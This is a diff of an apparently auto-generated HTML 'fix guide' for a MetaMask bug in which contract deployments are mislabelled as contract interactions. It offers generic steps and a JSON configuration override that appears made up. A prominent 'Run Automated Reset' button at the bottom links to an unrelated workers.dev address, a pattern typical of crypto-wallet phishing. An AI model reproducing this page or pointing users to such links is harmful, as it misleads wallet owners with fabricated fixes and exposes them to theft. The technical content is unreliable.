@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Contract Deployments Are Displayed – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: BlinkMacSystemFont;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -39,40 +39,38 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</h1>
+<h1>Metamask Extension Bug Activity Contract Deployments Are Displayed</h1>
 <h2>Symptom</h2>
 <ul>
 <li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that contract deployments are incorrectly displayed as contract interactions within the activity section of the extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's activity logging mechanism, which fails to differentiate between contract deployments and interactions, leading to incorrect labeling.</li>
+<li>The error occurs due to a bug in the Metamask extension's activity tracking and display logic, where it fails to differentiate between contract deployments and interactions, leading to misclassification and incorrect display of these activities.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and storage</li>
-<li>Reset the extension's settings to default</li>
-<li>Use the following JSON configuration to override the activity logging:</li>
+<li>To temporarily resolve this issue, users can try the following steps:</li>
+<li>Clearing the Metamask extension's cache and storage to ensure a fresh start.</li>
+<li>Disabling and re-enabling the extension to reset its internal state.</li>
+<li>Editing the extension's configuration to filter out incorrect activity types, which can be achieved by adding the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;activity&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;logging&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;contractDeployments&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;contractInteractions&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;activityFilters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;contractDeployments&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;contractInteractions&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced configuration options.</p>
+<p>Consider utilizing an external console for more complex configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured on your browser</li>
-<li>Basic understanding of Ethereum smart contracts and their deployment</li>
-<li>Familiarity with JSON configuration files and their application in browser extensions</li>
+<li>Metamask extension installed and configured on a compatible web browser.</li>
+<li>Basic understanding of Ethereum contract interactions and deployments.</li>
+<li>Access to the Metamask extension's settings and configuration options.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
